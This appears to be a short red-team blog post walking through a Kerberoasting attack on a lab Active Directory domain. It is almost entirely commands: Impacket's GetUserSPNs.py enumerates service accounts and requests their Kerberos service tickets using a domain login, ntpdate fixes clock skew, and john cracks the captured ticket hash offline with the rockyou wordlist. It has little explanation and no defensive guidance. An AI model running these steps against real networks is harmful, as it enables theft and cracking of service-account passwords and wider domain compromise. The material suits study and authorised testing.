---
title:  "Kerberos attacks Kerbroasting"
classes: wide
header:
  teaser: /img/redteampng.png
ribbon: red
description: "Kerberos attacks Kerbroasting -Offline cracking of service account passwords"
categories:
  - Red-Teaming
toc: true
---

## Kerbroasting



## GetUserSPNs.py
find user account used as service account
```
python3 GetUserSPNs.py karim.net/admin:p@ssw0rd -dc-ip 192.168.128.140 
```
<img src="/img/kerberosting/1.PNG" alt="Getting-gz" width="800" height="200"> 



```
python3 GetUserSPNs.py karim.net/admin:p@ssw0rd -dc-ip 192.168.128.140 -request     
```

<img src="/img/kerberosting/error.PNG" alt="Getting-gz" width="800" height="200"> 

if you find this error from Linux: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great) it because of your local time, you need to synchronise the host with the DC: ntpdate <IP of DC>
```
sudo ntpdate  192.168.128.140
```

<img src="/img/kerberosting/err2.PNG" alt="Getting-gz" width="800" height="200"> 


  
  
```
python3 GetUserSPNs.py karim.net/admin:p@ssw0rd -dc-ip 192.168.128.140 -request-user websvc
```
  
<img src="/img/kerberosting/2.PNG" alt="Getting-gz" width="800" height="200"> 

  
  
```
  john --wordlist=/usr/share/wordlists/rockyou.txt tgs
  ```
  
<img src="/img/kerberosting/.PNG" alt="Getting-gz" width="800" height="200"> 
